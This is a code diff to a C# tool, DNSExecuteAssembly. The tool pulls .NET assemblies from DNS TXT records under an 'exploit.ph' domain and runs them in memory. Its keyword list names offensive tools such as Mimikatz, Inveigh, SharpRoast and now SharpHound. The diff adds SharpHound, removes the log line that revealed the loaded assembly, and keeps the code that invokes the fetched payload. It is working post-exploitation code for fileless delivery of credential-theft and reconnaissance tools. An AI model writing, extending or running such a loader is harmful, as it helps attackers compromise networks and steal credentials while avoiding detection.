@@ -55,6 +55,7 @@ namespace DNSExecuteAssembly
                 Console.WriteLine("  keywords: iv = Inveigh");
                 Console.WriteLine("            mk = Mimikatz");
                 Console.WriteLine("            sb = Seatbelt");
+                Console.WriteLine("            sh = SharpHound");
                 Console.WriteLine("            sr = SharpRoast");
                 Console.WriteLine("            su = SharpUp");
                 Console.WriteLine("            sv = SharpView");
@@ -64,7 +65,6 @@ namespace DNSExecuteAssembly
             }
 
             string SearchRecord = string.Format("{0}-cs.t.exploit.ph.", args[0]);
-            Console.WriteLine("Loading assembly: {0}",SearchRecord);
             string Record = GetTxtRecords(SearchRecord);
             int end = Int32.Parse(Record);
             IEnumerable<int> recordnums = Enumerable.Range(0, end);
@@ -91,17 +91,11 @@ namespace DNSExecuteAssembly
                 MethodInfo entryPoint = a.EntryPoint;
                 if (entryPoint != null)
                 {
-                    Console.WriteLine("----- Assembly EntryPoint -----");
-                    foreach ( ParameterInfo pi in entryPoint.GetParameters() )
-                    {
-                        Console.WriteLine("\tMethod: {0}, Parameter: Type={1}, Name={2}", entryPoint.Name, pi.ParameterType, pi.Name);
-                    }
+                    MethodInfo method = a.EntryPoint;
+                    object o = a.CreateInstance(method.Name);
+                    object[] arr = new object[] { args.Skip(1).ToArray() };
+                    method.Invoke(o, arr);
                 }
-
-                MethodInfo method = a.EntryPoint;
-                object o = a.CreateInstance(method.Name);
-                object[] arr = new object[] { args.Skip(1).ToArray() };
-                method.Invoke(o, arr);
 
             }
             catch (Exception ex)
